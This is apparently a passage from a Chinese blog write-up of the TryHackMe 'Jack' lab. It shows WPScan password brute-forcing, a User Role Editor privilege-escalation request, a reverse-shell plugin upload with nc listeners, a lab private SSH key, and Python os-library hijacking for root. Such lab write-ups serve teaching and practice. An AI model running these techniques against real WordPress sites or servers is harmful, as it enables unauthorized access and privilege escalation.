<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/THM/Jack/workSpace]<br>└─$ sudo wpscan --url http://jack.thm -U user -P /usr/share/wordlists/fasttrack.txt <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>_______________________________________________________________<br>         __          _______   _____<br>         \ \        / /  __ \ / ____|<br>          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®<br>           \ \/  \/ / |  ___/ \___ \ / __|/ _` | <span class="hljs-string">&#x27;_ \</span><br><span class="hljs-string">            \  /\  /  | |     ____) | (__| (_| | | | |</span><br><span class="hljs-string">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span><br><span class="hljs-string"></span><br><span class="hljs-string">         WordPress Security Scanner by the WPScan Team</span><br><span class="hljs-string">                         Version 3.8.22</span><br><span class="hljs-string">       Sponsored by Automattic - https://automattic.com/</span><br><span class="hljs-string">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span><br><span class="hljs-string">_______________________________________________________________</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] URL: http://jack.thm/ [10.10.183.69]</span><br><span class="hljs-string">[+] Started: Tue Jun  6 16:26:36 2023</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Performing password attack on Xmlrpc against 3 user/s</span><br><span class="hljs-string">[SUCCESS] - wendy / changelater                                                              </span><br><span class="hljs-string">Trying danny / starwars Time: 00:01:54 &lt;=============     &gt; (646 / 868) 74.42%  ETA: ??:??:??</span><br><span class="hljs-string"></span><br><span class="hljs-string">[!] Valid Combinations Found:</span><br><span class="hljs-string"> | Username: wendy, Password: changelater</span><br><span class="hljs-string"></span><br><span class="hljs-string">[!] No WPScan API Token given, as a result vulnerability data has not been output.</span><br><span class="hljs-string">[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Finished: Tue Jun  6 16:28:55 2023</span><br><span class="hljs-string">[+] Requests Done: 818</span><br><span class="hljs-string">[+] Cached Requests: 7</span><br><span class="hljs-string">[+] Data Sent: 371.288 KB</span><br><span class="hljs-string">[+] Data Received: 610.033 KB</span><br><span class="hljs-string">[+] Memory used: 244.953 MB</span><br><span class="hljs-string">[+] Elapsed time: 00:02:18</span><br></code></pre></td></tr></table></figure>

<p>我们当然先用<code>wendy / changelater</code>试试ssh登录，然而不行，那就先等进后台吧。</p>
<p>看了一圈也没啥发现，就是一个普通用户，也没有什么其他的plugin。看看hint：<code>ure_other_roles</code>查了一下，发现这是个USER ROLE PLUGIN插件，基本是wordpress后台自带的插件。</p>
<p>我们查一下exp-db，发现有一个用ruby写的可以在metasploit用的exp。但是懒得开msf了，其实手动方法也很简单，网上也有相关资料<a target="_blank" rel="noopener" href="https://vk9-sec.com/wordpress-plugin-user-role-editor-4-24-privilege-escalation/">WordPress Plugin User Role Editor &lt; 4.24 - Privilege Escalation</a>。</p>
<p>我们直接来手动利用。</p>
<h3 id="WP-PLUGIN-URE-exploit"><a href="#WP-PLUGIN-URE-exploit" class="headerlink" title="WP-PLUGIN URE exploit"></a>WP-PLUGIN URE exploit</h3><p>这个漏洞是否存在识别起来其实有点玄学，因为URE插件版本一般看不出来，但是我们都可以尝试，只要在后台侧边栏有<code>user</code>或者<code>profile</code>用于让用户修改自己的profile，我们就可以试试。毕竟现在这个插件最先也就4.6版本，小于4.24都能用。</p>
<p>我们先点击页面里的update按钮，这会生成一个请求：</p>
<p class='item-img' data-src='/pic/assets/jack-exploit-ure.png'><img src="/pic/assets/jack-exploit-ure.png" alt="jack-exploit-ure"></p>
<p>此时，我们在POST请求最后加上<code>&amp;ure_other_roles=administrator</code>把自己编辑成为管理员：</p>
<p class='item-img' data-src='/pic/assets/jack-exp-success.png'><img src="/pic/assets/jack-exp-success.png" alt="jack-exp-success"></p>
<p>然后就能成功升级成管理员权限。这个漏洞的原因是URE插件对于用户更新profile时没有进行严格的身份验证，这就导致了用户可以将自己添加为管理员。</p>
<p>而当我们拿到了wordpress的管理员权限，事情一下就简单了起来。因为有我们最喜欢的theme edit以及plugin upload拿shell方法。</p>
<h3 id="上传反弹shell"><a href="#上传反弹shell" class="headerlink" title="上传反弹shell"></a>上传反弹shell</h3><p>然而，在我们直接编辑主题模版时，会出现错误，让我们无法成功编辑。</p>
<p>无所谓，插件安装会出手。</p>
<p>我们直接编辑好反弹shell，传上去。</p>
<p class='item-img' data-src='/pic/assets/jack-upload-plugin.png'><img src="/pic/assets/jack-upload-plugin.png" alt="jack-upload-plugin"></p>
<p>上传好后在<code>/wp-content/uploads</code>里面就能找到。</p>
<p class='item-img' data-src='/pic/assets/jack-upload-shell.png'><img src="/pic/assets/jack-upload-shell.png" alt="jack-upload-shell"></p>
<p>直接访问就能拿到shell。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/THM/Jack/workSpace]<br>└─$ sudo nc -lvp 443                 <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 443 ...<br>connect to [10.11.40.37] from jack.thm [10.10.183.69] 34350<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (1123): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>www-data@jack:/var/www/html/wp-content/uploads/2023/06$ <span class="hljs-built_in">uname</span> -a<br><span class="hljs-built_in">uname</span> -a<br>Linux jack 4.4.0-142-generic <span class="hljs-comment">#168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span><br>www-data@jack:/var/www/html/wp-content/uploads/2023/06$<br></code></pre></td></tr></table></figure>

<p>成功拿shell，userflag在jack的home目录下，且可以直接查看。</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>www-data的权限一如既往的不理想，不知道密码，<code>sudo -l</code>用不了，也没有啥SUID可用的二进制文件，单看定时任务也没有什么特别的。</p>
<h3 id="手动枚举"><a href="#手动枚举" class="headerlink" title="手动枚举"></a>手动枚举</h3><p>先看<code>/home</code>目录，里面只有一个用户jack。看看他的home目录。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@jack:/home/jack$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 36<br>drwxr-xr-x 4 jack jack 4096 Jan 10  2020 .<br>drwxr-xr-x 3 root root 4096 Jan  8  2020 ..<br>lrwxrwxrwx 1 jack jack    9 Jan 10  2020 .bash_history -&gt; /dev/null<br>-rw-r--r-- 1 jack jack  220 Jan  8  2020 .bash_logout<br>-rw-r--r-- 1 jack jack 3771 Jan  8  2020 .bashrc<br>drwx------ 2 jack jack 4096 Jan  9  2020 .cache<br>-rw-r--r-- 1 jack jack  655 Jan  8  2020 .profile<br>drwx------ 2 jack jack 4096 Jan 10  2020 .ssh<br>-rw-r--r-- 1 root root  140 Jan 10  2020 reminder.txt<br>-rw-rw-r-- 1 jack jack   33 Jan 10  2020 user.txt<br>www-data@jack:/home/jack$ <span class="hljs-built_in">cat</span> user      <br><span class="hljs-built_in">cat</span> user.txt <br>********************************<br>www-data@jack:/home/jack$ <span class="hljs-built_in">cat</span> re <br><span class="hljs-built_in">cat</span> reminder.txt <br><br>Please <span class="hljs-built_in">read</span> the memo on linux file permissions, last time your backups almost got us hacked! Jack will hear about this when he gets back.<br><br>www-data@jack:/home/jack$ <span class="hljs-built_in">cat</span> .bash_history<br><span class="hljs-built_in">cat</span> .bash_history<br>www-data@jack:/home/jack$ <br></code></pre></td></tr></table></figure>

<p>reminder给我们带来了很重要的信息，系统里面有个B喜欢备份重要文件。那我们直奔<code>/var/backups</code>看看。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@jack:/var/backups$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 776<br>drwxr-xr-x  2 root root     4096 Jan 10  2020 .<br>drwxr-xr-x 14 root root     4096 Jan  9  2020 ..<br>-rw-r--r--  1 root root    40960 Jan  9  2020 alternatives.tar.0<br>-rw-r--r--  1 root root     9931 Jan  9  2020 apt.extended_states.0<br>-rw-r--r--  1 root root      713 Jan  8  2020 apt.extended_states.1.gz<br>-rw-r--r--  1 root root       11 Jan  8  2020 dpkg.arch.0<br>-rw-r--r--  1 root root       43 Jan  8  2020 dpkg.arch.1.gz<br>-rw-r--r--  1 root root      437 Jan  8  2020 dpkg.diversions.0<br>-rw-r--r--  1 root root      202 Jan  8  2020 dpkg.diversions.1.gz<br>-rw-r--r--  1 root root      207 Jan  9  2020 dpkg.statoverride.0<br>-rw-r--r--  1 root root      129 Jan  8  2020 dpkg.statoverride.1.gz<br>-rw-r--r--  1 root root   552673 Jan  9  2020 dpkg.status.0<br>-rw-r--r--  1 root root   129487 Jan  8  2020 dpkg.status.1.gz<br>-rw-------  1 root root      813 Jan 10  2020 group.bak<br>-rw-------  1 root shadow    679 Jan 10  2020 gshadow.bak<br>-rwxrwxrwx  1 root root     1675 Jan 10  2020 id_rsa<br>-rw-------  1 root root     1626 Jan  9  2020 passwd.bak<br>-rw-------  1 root shadow   1066 Jan 10  2020 shadow.bak<br>www-data@jack:/var/backups$ <span class="hljs-built_in">cat</span> id_rsa<br><span class="hljs-built_in">cat</span> id_rsa<br>-----BEGIN RSA PRIVATE KEY-----<br>MIIEowIBAAKCAQEAxfBR9F9V5G2snv1Xaaxv3VHbFZ2VZRwGyU+ah6komBeaAldr<br>8SNK1x0wu/eXjLjrWnVaYOEU2YUrHzn/duB3Wvm8xyA0T8x/WbV2osWaVOafkPSv<br>YpV4OdQrdRoS3PEOXRnS+CnOTAgPWo2+xfH1XeldFw9XiYrprTugmwCcYDuBZB3r<br>zmWA8sPWjLjs6xzNK26RQQbo9zaxwfEdjZ3an9JngJJ7m0rtF9vKeCRfO1V8sd/t<br>1lu96Kqn4FZUTXQFEGfAYupG6b3vpRwqmI6y2VjK5MxlMmEdwP8oxmKR4XRqvSK1<br>8m5byz8ZUu1RfB8Ug/pKK9VVbk9QFWbrV4E3FwIDAQABAoIBAEEr0TAOu68MVUu7<br>yi4m8mYCb4n8apXx1mIt7YlBLvZ0vuaKdiXdIuUU3VjmOmXA9OzButIvCbhc2kfb<br>xrsTSPkRRRCjD9Y+VKfq0XbibOALVvpZNe3VnNIdg3l47kEEtV/+ArJmwV/TP4rn<br>JKrz8X/MODRBfubwb+Pzv/uJBfPAzvkokKUp9D2LqNjQEY4w71j0yUl+A0xnkT4i<br>L1FbzghdARExy2cJN0RfdDKhy/DfXos7+JHso3ZvXmSx0ivS+HyCblO25Kcmy4Vh<br>FZotNk+28iw6DKm1wrgAjj0sdLpB6jW9+M/kSQCovMijPM8h8JNPLNOJMFSKWBH8<br>m9US/XECgYEA+AW0bbMVoylAcWGold85Ileyuw/q3HwsDdRrO43uMZvQe8f5TRsd<br>Q9SvAEz9T46YErySq33jOPmsGLf02EEiyGggpBiuhi3FmtMa7440qGFig4Q5IVxn<br>QuSDUQvxN/uVE+TZxlRPTUeAFPcAI4DAUYbubAcJzvXeAsCPsKbQGw0CgYEAzE42<br>H8SUWiCMXBMotEUpn14pGcP4O+hei9j7P1Nupy/F63UtYPvXN4oi75YeLiInUXzU<br>S/r3+AxoNafMAy67oQhLKHXs+NOP5aEkVhNDhHFNpWutYPn9aLWUIx1tXbWsaecE<br>i7OCxjp0L5lDRVl3TLzXeZmtp0oSAPKNRYmgQbMCgYAvL0aoKA3RwKNV7rJX8OO5<br>uN1z4Q9ZavYmm2bbKaFLJs1+/whatvHWWbwBXqRCYmpkBiQRJB36VOV8vmKCUcIA<br>Rm8PSPLK7CJP1iGluXQjJIPNaXZE9oNeooKpBJCbie1On5ceuCNuHFAtrOAF4RS1<br>beol+yDOks/tzhyICvREcQKBgCHIiRClu/ZPTYZoMKHmkeRleJxnGGQnn4K2hY1K<br>KZEByFOQE8nmuwbXE8HUa/cq9J936c8Kl/hvbMf6kDSyhJozOeJd5aqbqT7Kb6zA<br>ELkU10cUUB4qGGo5JF7OHeiSAwmcBtdm/qfywIWibUpJaf3JeEQGUn3INMPtV8j4<br>4gQbAoGBAKuXPITKuO7SsRfXcwB3MO3iCTLdW7BYnYF1SzVbPBonmcsxlQinvoRg<br>2faWmSFAUK6cIys9za3pzOw3FP8W9Q5SGsA9KriSYj6/h7ei9GeJAr3mxlbGnkZN<br>ZFqUVe2Jvxq++O6Ub41zUtWINbR5Fxf+kTlJIIwqc6IuzZq+QWXy<br>-----END RSA PRIVATE KEY-----<br></code></pre></td></tr></table></figure>

<p>喜提ssh登录密钥。</p>
<p>尝试了下root没有成功（当然没这么简单），那就只剩下jack这个选项了，成功登录。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh jack@10.10.237.140 -i root_rsa<br></code></pre></td></tr></table></figure>

<h3 id="python库注入"><a href="#python库注入" class="headerlink" title="python库注入"></a>python库注入</h3><p>然而因为我们是ssh登录的jack用户，并不知道密码，<code>sudo -l</code>显然是用不了了。在我们四处查看下，发现了<code>/opt</code>下有东西，还是python文件，这不是很寻常。一般这里应没啥东西才对。（你问我为啥要看的&#x2F;opt的话是因为以前打的靶机里面就有藏B喜欢在这个目录下藏东西，只能说是吃一堑长一智了，反正就ls一下的事）没有这个思路的话其实用linpeas扫一下也会报给你&#x2F;opt下有不常见目录，看一下就好。</p>
<p class='item-img' data-src='/pic/assets/uTools_1686128367451.png'><img src="/pic/assets/uTools_1686128367451.png" alt="uTools_1686128367451"></p>
<p>然而这个checker.py文件当前用户只能看，不能读和执行，看看内容吧那就。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">jack@jack:/opt/statuscheck<span class="hljs-variable">$cat</span> checker.py<br>import os<br><br>os.system(<span class="hljs-string">&quot;/usr/bin/curl -s -I http://127.0.0.1 &gt;/opt/statuscheck/output.log&quot;</span>)<br></code></pre></td></tr></table></figure>

<p>内容就是向同目录下的output.log写入。我们查看output.log文件发现其内容是每隔一段时间就更新一次。所以checker的作用就是定时写入日志，而且显然是以root身份执行的。找了一下也不知道这个定时任务到底如何触发，在哪执行的。但是我们能知道的是他一定是定时在执行。</p>
<p>可是我们也没有权限修改这个文件，并且curl也是绝对路径写的，想利用PATH估计是没戏的，而且我们大概率改不了<code>/usr/bin</code>的curl文件。难道这条路走不通吗。</p>
<p>不死心，在搜索引擎查一下root权限的python文件如何利用。</p>
<p class='item-img' data-src='/pic/assets/uTools_1686129080629.png'><img src="/pic/assets/uTools_1686129080629.png" alt="uTools_1686129080629"></p>
<p>发现<a target="_blank" rel="noopener" href="https://blog.csdn.net/beetxia/article/details/118407023">有博客</a>提供了几种python文件提权的方式。</p>
<p>提到了库劫持。</p>
<p>文件中import了os库，我们试试能不能劫持。</p>
<p>我们先寻找os库文件位置以及查看是否有权限，因为一般而言这些目录多半只有root才能编辑。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">jack@jack:/opt/statuscheck<span class="hljs-variable">$locate</span> os.py<br>/usr/lib/python2.7/os.py<br>/usr/lib/python2.7/os.pyc<br>/usr/lib/python2.7/encodings/palmos.py<br>/usr/lib/python2.7/encodings/palmos.pyc<br>/usr/lib/python3/dist-packages/LanguageSelector/macros.py<br>/usr/lib/python3.5/os.py<br>/usr/lib/python3.5/encodings/palmos.py<br>jack@jack:/opt/statuscheck<span class="hljs-variable">$ls</span> -l /usr/lib/python2.7/os.py<br>-rw-rw-r-x 1 root family 25908 Nov 16 2020 /usr/lib/python2.7/os.py<br>jackajack:/opt/statuscheck<span class="hljs-variable">$id</span><br>uid=1000(jack)gid=1000(jack)<span class="hljs-built_in">groups</span>=1000(jack),4(adm),24(cdrom),30(dip),46(plugdev),115(lpadmin)<br>116(sambashare),1001(family)<br></code></pre></td></tr></table></figure>

<p>我们发现竟然family组就能编辑os库文件，而jack用户正好是该组的用户。那我们直接vim往os库里注入我们的反弹shell，这样checker.py调用库的时候就会给我们弹回反弹root shell。按理来说，我们应该在os库里system函数中注入我们的payload，然而我找了半天没找到在哪，所以只能写在最后试试了。</p>
<p class='item-img' data-src='/pic/assets/uTools_1686065694886.png'><img src="/pic/assets/uTools_1686065694886.png" alt="uTools_1686065694886"></p>
<p>写完之后可以用<code>tail -f output.log</code>实时查看文件有没有更新，如果更新了就说明checker执行了， 那应该就会给我们弹回来shell。</p>
<p class='item-img' data-src='/pic/assets/uTools_1686129697078.png'><img src="/pic/assets/uTools_1686129697078.png" alt="uTools_1686129697078"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/THM/Jack/workSpace]<br>└─$ sudo nc -lvp 8080<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 8080 ...<br>connect to [10.8.134.236] from jack.thm [10.10.237.140] 43558<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (2730): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>root@jack:~<span class="hljs-comment"># ls -la</span><br><span class="hljs-built_in">ls</span> -la<br>total 28<br>drwxr-x--x  4 root root 4096 Nov 16  2020 .<br>drwxr-xr-x 23 root root 4096 Jan  8  2020 ..<br>lrwxrwxrwx  1 root root    9 Jan 10  2020 .bash_history -&gt; /dev/null<br>-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc<br>drwx------  2 root root 4096 Nov 16  2020 .cache<br>-rw-r--r--  1 root root  148 Aug 17  2015 .profile<br>-r--------  1 root root   33 Jan 10  2020 root.txt<br>drwxr-xr-x  2 root root 4096 Nov 16  2020 .ssh<br>root@jack:~<span class="hljs-comment"># cat root.txt</span><br><span class="hljs-built_in">cat</span> root.txt<br>*****************************<br>root@jack:~<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>

<p>成功拿到root flag。</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/07/03/Precious/">← Next [HTB]  Precious</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/06/04/Year-of-the-Jellyfish/">[THM]  Year of the Jellyfish Prev →</a></div></div></div><div id="comments"><div class="selector"><button class="gitalk-sel"></button></div><div id="gitalk"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Dr.T3yT3y</a></h1><div id="description"><p>May the flame guide thee</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E6%B8%97%E9%80%8F"><span class="toc-number">3.</span> <span class="toc-text">web渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WP-%E7%88%86%E7%A0%B4"><span class="toc-number">3.1.</span> <span class="toc-text">WP-爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WP-PLUGIN-URE-exploit"><span class="toc-number">3.2.</span> <span class="toc-text">WP-PLUGIN URE exploit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">3.3.</span> <span class="toc-text">上传反弹shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%9E%9A%E4%B8%BE"><span class="toc-number">4.1.</span> <span class="toc-text">手动枚举</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#python%E5%BA%93%E6%B3%A8%E5%85%A5"><span class="toc-number">4.2.</span> <span class="toc-text">python库注入</span></a></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plu</a></nobr><wbr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {gitalk = new Gitalk({
 clientID: 'd746fee266fd40784c87',
 clientSecret: '18467221d189fe0e0b51bd234fcd04785a28ab09',
 repo: 'T3yT3y.github.io',
 owner: 'T3yT3y',
 admin: ['T3yT3y'],
 distractionFreeMode: false,
 id: location.pathname
});
if (document.querySelector("#gitalk")) gitalk.render("gitalk");code.findCode();
document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>